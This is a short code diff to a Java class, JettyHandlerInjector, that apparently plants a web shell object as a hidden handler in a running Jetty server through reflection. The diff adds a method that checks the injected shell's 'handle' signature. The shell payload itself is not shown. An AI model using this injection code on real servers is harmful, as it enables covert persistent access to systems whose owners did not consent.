@@ -59,6 +59,7 @@ public class JettyHandlerInjector {
         if (handler.getClass().isAssignableFrom(nextHandler.getClass())) {
             return;
         }
+        validateHandler(handler);
         setFieldValue(handler, "nextHandler", nextHandler);
         setFieldValue(handler, "_server", server);
 
@@ -75,6 +76,20 @@ public class JettyHandlerInjector {
             invokeMethod(server, "addBean", new Class[]{Object.class, boolean.class}, new Object[]{handler, true});
         } catch (Throwable ignored) {
         }
+    }
+
+    public void validateHandler(Object shell) throws Exception {
+        Class<?> handlerClass = shell.getClass().getSuperclass();
+        Method rightHandleMethod = null;
+        for (Method method : handlerClass.getMethods()) {
+            if (method.getName().equals("handle")) {
+                rightHandleMethod = method;
+            }
+        }
+        shell.getClass().getMethod(
+                "handle",
+                rightHandleMethod.getParameterTypes()
+        );
     }
 
     @Override
